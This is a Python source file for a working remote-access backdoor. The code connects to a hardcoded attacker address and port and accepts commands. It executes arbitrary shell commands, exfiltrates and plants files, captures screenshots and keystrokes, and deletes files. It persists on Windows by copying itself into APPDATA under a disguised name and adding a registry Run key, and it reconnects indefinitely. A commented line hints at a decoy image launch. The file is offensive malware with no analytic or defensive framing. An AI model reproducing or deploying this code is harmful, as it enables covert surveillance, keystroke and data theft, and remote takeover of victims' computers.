import os,sys,time,base64,socket,subprocess,json , platform
from PIL import ImageGrab
from pynput import keyboard

class backdoor :
    def __init__(self,ip,port) :
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.ip = ip
        self.port = port
        self.message = ""

    def execute_command(self,command) :
        c = " "
        c = c.join(command)
        command = c
        try :
            f = open(os.devnull,"wb")
            return subprocess.check_output(command,shell=True,stderr=f,stdin=f).decode('utf-8')
        except Exception as e :
            error = str(e) + "\nThis error has occurred check your command"
            return error

    def j_send(self,output) :
        data = json.dumps(output)
        self.connection.send(data.encode('utf-8'))

    def j_recv(self) :
        data = ""
        while True :
            try :
                data += self.connection.recv(1024).decode('utf-8')
                return json.loads(data)
            except :
                continue

    def change_directory(self,path) :
        try :
            os.chdir(path)
            output = "[+] changing current working directory to "+path
            return output
        except Exception as e :
            error = str(e) + "\nThis error has occurred check your command"
            return error

    def read_file(self,path) :
        try :
            with open(path,"rb") as file :
                output = file.read()
            return base64.b64encode(output).decode('utf-8')
        except Exception as e :
            return str(e)

    def write_file(self,data,path) :
        try :
            with open(path,"wb") as file :
                file.write(base64.b64decode(data))
            return "Sucessfully uploaded"
        except Exception as e :
            return str(e)

    def change_location(self) :
        path = os.environ.get('APPDATA')
        path += "\\windows_config.exe"
        if not os.path.exists(path) :
            f = open(os.devnull,"wb")
            cmd = ["copy",sys.executable,path]
            subprocess.run(cmd,shell=True,stdout=f,stderr=f,stdin=f)
            f.close()
        else :
            return

    def persistance(self) : # Make two functions one for the windows and other for the linux based os
        # print("\nPersistance activated !! \n")
        path = os.environ.get('APPDATA')
        path += "\\windows_config.exe"
        if not os.path.exists(path) :
            self.change_location()
            f = open(os.devnull,"wb")
            subprocess.run('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsconf /t REG_SZ /d "' + path + '"', shell=True,stdout=f,stdin=f,stderr=f)
            f.close()
        else :
            return

    def screenshot(self) :
        try :
            image = ImageGrab.grab(bbox = None)
            image.save("test.png") # save this image in temp folder
            output = self.read_file("test.png")
            os.remove("test.png")
            return output
        except :
            return "Cannot capture the image ,try again"

    def get_sys_details(self) :
        try :
            return str(platform.uname())
        except Exception as e :
            return str(e)

    def on_press(self,key) :
        try :
            self.message += key.char
        except AttributeError :
            if key == key.space :
                self.message += " "
            elif key == key.tab :
                self.message += "    "
            elif key == key.enter :
                self.message += "\n"
            elif key == key.backspace :
                self.message += "\b"
            else :
                self.message += " "+str(key)+" "

    def capture_key_strokes(self,seconds) :
        try :
            listener = keyboard.Listener(on_press=self.on_press)
            start_time = time.time()
            listener.start()
            while True :
                current_time = time.time()
                elapsed_time = current_time - start_time
                if int(elapsed_time) > int(seconds) :
                    break
            listener.stop()
            captured_strokes = self.message
            self.message = ""
            return str(captured_strokes)
        except Exception as e :
            return str(e)

    def delete_file(self,file_name) :
        try :
            os.remove(file_name)
            return "Sucessfully deleted the given file"
        except Exception as e :
            return str(e)

    def run(self) :
        self.connection.connect((self.ip,self.port))
        self.persistance()
        command = self.j_recv()
        while command[0] != "exit" :
            try :
                if command[0] == "cd" and len(command) > 1 :
                    output = self.change_directory(command[1])
                elif command[0] == "download" and len(command) > 1 :
                    output = self.read_file(command[1])
                elif command[0] == "upload" and len(command) > 1 :
                    output = self.write_file(command[2],command[1])
                elif command[0] == "screenshot" :
                    output = self.screenshot()
                elif command[0] == "keylogger" :
                    output = self.capture_key_strokes(command[1])
                elif command[0] == "get_details" :
                    output = self.get_sys_details()
                elif command[0] == "remove" and len(command) > 1 :
                    output = self.delete_file(command[1])
                else :
                    output = self.execute_command(command)
                if not output :
                    output = "Returned a None output please check !!"
                self.j_send(output)
                command = self.j_recv()
            except Exception as e:
                continue

        self.connection.close()


def rerun(b) : # compare and check the code with keylogger one
    try :
        b.run()
        time.sleep(10)
        rerun(b)
    except :
        b = backdoor("192.168.2.8",8080)
        time.sleep(5)
        rerun(b)

#name = sys._MEIPASS + "\index.jpeg"
#subprocess.Popen(name , shell=True)

b = backdoor("192.168.2.8",8080)
rerun(b)
